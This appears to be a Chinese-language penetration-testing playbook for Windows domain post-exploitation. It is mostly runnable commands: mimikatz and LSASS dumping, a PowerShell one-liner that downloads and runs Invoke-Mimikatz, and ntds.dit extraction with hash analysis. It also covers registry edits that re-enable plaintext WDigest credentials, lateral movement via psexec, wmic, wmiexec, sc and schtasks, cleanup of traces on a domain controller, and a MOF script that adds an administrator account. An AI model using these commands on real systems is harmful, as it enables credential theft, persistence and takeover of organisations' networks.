![](./pic/5/6.jpg)
##### win8+win2012明文抓取 
测试失败  
工具：https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1  
文章地址：https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/  
更新KB2871997补丁后，可禁用Wdigest Auth强制系统的内存不保存明文口令，此时mimikatz和wce均无法获得系统的明文口令。但是其他一些系统服务(如IIS的SSO身份验证)在运行的过程中需要Wdigest Auth开启，所以补丁采取了折中的办法——安装补丁后可选择是否禁用Wdigest Auth。当然，如果启用Wdigest Auth，内存中还是会保存系统的明文口令。   
需要将UseLogonCredential的值设为1，然后注销当前用户，用户再次登录后使用mimikatz即可导出明文口令，故修改一个注册表就可以抓取了    
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
***
#### 域用户hash抓取  
##### mimikatz
只能抓取登陆过的用户hash，无法抓取所有用户,需要免杀  
1、本机测试直接获取内存中的明文密码  
```
privilege::debug
sekurlsa::logonpasswords
```
![](./pic/5/1.jpg)  
2、非交互式抓明文密码(webshell中)  
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" > pssword.txt
```
3、powershell加载mimikatz抓取密码  
```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
```
4、ProcDump + Mimikatz本地分析  
文件会比较大，低效，但是安全(绕过杀软)   
ps:mimikatz的平台（platform）要与进行dump的系统(source dump)兼容(比如dowm了08的,本地就要用08系统来分析)  
```
远程：
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
本地：
sekurlsa::minidump lsass.dump.dmp
sekurlsa::logonpasswords full
```
![](./pic/5/2.jpg)  
##### ntds.dit的导出+QuarkPwDump读取分析 
无法抓取所有用户,需要免杀  
这个方法分为两步：  
第一步是利用工具导出ntds.dit  
第二步是利用QuarkPwDump去分析hash  
1、ntds.dit的导出  
1. ntdsutil    win2008开始DC中自带的工具  
a.交互式
```
>
>snapshot
>activate instance ntds
>create
>mount xxx
>
```
![](./pic/5/7.jpg)  
做完后unmount然后需要再delet一下    
![](./pic/5/8.jpg)   
b.非交互   
```
>
>ntdsutil snapshot "activate instance ntds" create quit quit
>ntdsutil snapshot "mount {GUID}" quit quit
>copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit
>ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quit
>
```
![](./pic/5/9.jpg)   
2. vshadow   微软的卷影拷贝工具  
```
>
>vshadow.exe -exec=%ComSpec% C:
>
```
其中%ComSpec%是cmd的绝对路径,它在建立卷影后会启动一个程序,只有这个程序才能卷影进行操作,其他不能,比如这里就是用cmd.exe来的 
最后exit一下  
![](./pic/5/10.jpg)  
2、QuarkPwDump分析  
https://github.com/quarkslab/quarkspwdump  
1. 在线提取  
```
QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit
```
2. 离线提取  
需要两个文件 ntds.dit 和 system.hiv  
其中system.hiv可通过`reg save hklm\system system.hiv` 获取  
```
QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hiv  
```
![](./pic/5/11.jpg)  
3、实战中hash导出流程  
```
>1.建立ipc$连接
>`net use \\DC1\c$ password /user:username`  
>2.复制文件到DC
>`copy .\* \\DC1\windows\tasks`  
>3.sc建立远程服务启动程序  
>`sc \\DC1 create backupntds binPath= "cmd /c start c:\windows\tasks\shadowcopy.bat" type= share start= auto error= ignore DisplayName= BackupNTDS`  
>4.启动服务  
>`sc \\DC1 start backupntds`  
>5.删除服务  
>`sc \\DC1 delete backupntds`  
>6.讲hash转移到本地  
>`move \\DC1\c$\windows\tasks\hash.txt .`  
>7.删除记录文件  
>`del \\DC1\c$\windows\tasks\ntds.dit \\DC1\c$\windows\tasks\QuarksPwDump.exe \\DC1\c$\windows\tasks\shadowcopy.bat \\DC1\c$\windows\tasks\vshadow.exe`  
```
![](./pic/5/12.jpg)  
注意的两点是：  
a.WORK_PATH和你拷贝的地方要相同  
![](./pic/5/13.jpg)  
b.附件中的QuarkPwDump在win08上面运行报错,另外修改版可以,所以实战前还是要测试一下  
##### vssown.vbs + libesedb + NtdsXtract
上面的QuarkPwDump是在win上面分析ntds.dit,这个是linux上面的离线分析  
优点是能获取全部的用户,不用免杀,但是数据特别大,效率低,另外用vssown.vbs复制出来的ntds.dit数据库无法使用QuarksPwDump.exe读取  
hash导出：  
https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs  
最后需要copy出system和ntds.dit两个文件  
```
c:\windows\system32\config\system
c:\windows\ntds\ntds.dit
```
![](./pic/5/14.jpg)  
![](./pic/5/15.jpg)  
记得一定要delete快照！
```
cscript vssown.vbs /delete *
```
本地环境搭建+分析：  
```
libesedb的搭建:
wget https://github.com/libyal/libesedb/releases/download/20151213/libesedb-experimental-20151213.tar.gz
tar zxvf libesedb-experimental-20151213.tar.gz
cd libesedb-20151213/
./configure
make
cd esedbtools/
(需要把刚刚vbs脱下来的ntds.dit放到kali)
./esedbexport ./ntds.dit
mv ntds.dit.export/ ../../
ntdsxtract工具的安装:
wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
unzip ntdsxtract_v1_0.zip
cd NTDSXtract 1.0/
(需要把刚刚vbs脱下来的SYSTEM放到/root/SYSTEM)
python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes '/root/SYSTEM'
```
![](./pic/5/16.jpg)  
##### ntdsdump
laterain的推荐：http://z-cg.com/post/ntds_dit_pwd_dumper.html  
是zcgonvh大牛根据quarkspwdump修改的，没找到和QuarkPwDump那个修改版的区别  
获取ntds.dit和system.hiv之后(不用利用那个vbs导出,好像并不能分析出来)  
![](./pic/5/17.jpg)
##### 利用powershell(DSInternals)分析hash
查看powershell版本：    
```
$PSVersionTable.PSVersion
看第一个Major
或者
Get-Host | Select-Object Version
```
Windows Server 2008 R2默认环境下PowerShell版本2.0，应该升级到3.0版本以上,需要.NET Framework 4.0  
需要文件：  
```
ntds.dit(vshadow获取)
system(reg获取)
```
执行命令：  
```
允许执行脚本：
Set-ExecutionPolicy Unrestricted
导入模块(测试是win2012_powershell ver4.0)：
Import-Module .\DSInternals
(powershell ver5.0)
Install-Module DSInternals
分析hash,并导出到当前目录的hash.txt文件中
1、$key = Get-BootKey -SystemHivePath 'C:\Users\administrator\Desktop\SYSTEM'
2、Get-ADDBAccount -All -DBPath 'C:\Users\administrator\Desktop\ntds.dit' -BootKey $key | Out-File hash.txt
```
![](./pic/5/18.jpg)  
这个只是离线分析了ntds.dit文件,其实也可以在线操作,不过感觉实战中遇到的会比较少,毕竟现在主流是win08为域控(以后这个倒不失为一个好方法)  
***
### 远程连接&&执行程序
##### at&schtasks
需要开启Task Scheduler服务  
经典流程：  
```
1、进行一个连接
net use \\10.10.24.44\ipc$ 密码 /user:账号
2、复制本地文件到10.10.24.44的share共享目录(一般是放入admin$这个共享地方(也就是c:\winnt\system32\)，或者c$，d$)
copy 4.bat \\10.10.24.44\share
3、查看10.10.24.44服务器的时间
net time \\10.10.24.44
4、添加at任务执行
at \\10.10.24.44 6:21 \\10.10.24.44\share\4.bat
这个6:21指的是上午的时间，如果想添加下午的，则是6.21PM
5、查看添加的所有at任务列表(如果执行了得，就不会显示)
at \\10.10.24.44
```
其他命令：  
```
查看所有连接
net use
删除连接
net use \\10.10.24.44\share /del
映射共享磁盘到本地
net use z: \\IP\c$ "密码" /user:"用户名"
删除共享映射
net use c: /del
net use * /del
```
**at过去后如果找不到网络路径,则判断是目标主机已禁用Task Scheduler服务**  
##### psexec
第一次运行会弹框,输入–accepteula这个参数就可以绕过  
```
psexec.exe \\ip –accepteula -u username -p password program.exe
```
![](./pic/6/1.jpg)  
另外两个比较重要的参数  
```
-c :拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）
-d 不等待程序执行完就返回
比如想上传一个本地的getpass到你远程连接的服务器上去:
Psexec.exe \\ip –u user –p pass –c c:\getpass.exe –d
```
另外学习一波pstools的一些运用  
**如果出现找不到网络名，判断目标主机已禁用ADMIN$共享**  
##### wmic  
net use后：  
```
copy 1.bat \\host\c$\windows\temp\1.bat  
wmic /node:ip /user:test /password:testtest process call create c:\windows\temp\1.bat  
```
![](./pic/6/2.jpg)  
ps:  
如果出现User credentials cannot be used for local connections,应该是调用了calc.exe权限不够的问题  
如果出现Description = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断WMI服务被禁用  
##### wmiexec.vbs  
```
1、半交互模式
cscript.exe //nologo wmiexec.vbs /shell ip username password
2、单命令执行
cscript.exe wmiexec.vbs /cmd ip username password "command"
3、wce_hash注入
如果抓取的LM hash是AAD3开头的，或者是No Password之类的，就用32个0代替LM hash
wce -s hash
cscript.exe //nologo wmiexec.vbs /shell ip
```
![](./pic/6/3.jpg)  
wmi只是创建进程,没办法去判断一个进程是否执行完成(比如ping),这样就导致wmi.dll删除不成,下一次又是被占用,这时候修改一下vbs里面的名字就好：`Const FileName = "wmi1.dll"`,也可以加入`-persist`参数(后台运行)  
另外有一个uac问题  
**非域用户**登陆到win08和2012中,只有administrator可以登陆成功,其他管理员账号会出现WMIEXEC ERROR: Access is denied
需要在win08或者2012上面执行,然后才可以连接:  
```
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
![](./pic/6/4.jpg)  
##### smbexec
这个可以根据其他共享(c$、ipc$)来获取一个cmd  
```
先把execserver.exe复制到目标的windows目录下,然后本机执行
test.exe ip user pass command sharename
```
![](./pic/6/5.jpg)  
##### powershell remoting
感觉实质上还是操作wmi实现的一个执行程序  
https://github.com/samratashok/nishang/blob/5da8e915fcd56fc76fc16110083948e106486af0/Shells/Invoke-PowerShellWmi.ps1  
##### SC创建服务执行
一定要注意的是binpath这些设置的后面是有一个**空格**的  
```
1、系统权限(其中test为服务名)
sc \\DC1 create test binpath= c:\cmd.exe
sc \\DC1 start test
sc \\DC1 delete test
2.指定用户权限启动
sc \\DC1 create test binpath = "c:\1.exe" obj= "centoso\administrator" passwrod= test
sc \\DC1 start test
```
##### schtasks
schtasks计划任务远程运行  
```
命令原型：
schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru {[Domain\]User | "System"} [/rp Password]] /?
For example:
schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System
schtasks /run /tn foobar /S host
schtasks /F /delete /tn foobar /S host
```
验证失败：win03连到08,xp连到08,xp连到03(但是并没有真正的成功执行,不知道是不是有姿势错了)  
![](./pic/6/6.jpg)  
更多用法：http://www.feiesoft.com/windows/cmd/schtasks.htm  
##### SMB+MOF || DLL Hijacks
其实这个思路一般都有用到的,比如在mof提权(上传mof文件到c:/windows/system32/wbem/mof/mof.mof)中,lpk_dll劫持  
不过测试添加账号成功...执行文件缺失败了  
```
#pragma namespace("\\\\.\\root\\subscription")
instance of __EventFilter as $EventFilter
{
    EventNamespace = "Root\\Cimv2";
    Name  = "filtP2";
    Query = "Select * From __InstanceModificationEvent "
            "Where TargetInstance Isa \"Win32_LocalTime\" "
            "And TargetInstance.Second = 5";
    QueryLanguage = "WQL";
};
instance of ActiveScriptEventConsumer as $Consumer
{
    Name = "consPCSV2";
    ScriptingEngine = "JScript";
    ScriptText =
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin adminaz1 /add\")";
};
instance of __FilterToConsumerBinding
{
    Consumer   = $Consumer;
    Filter = $EventFilter;
};
```
##### PTH + compmgmt.msc  
![](./pic/6/7.jpg)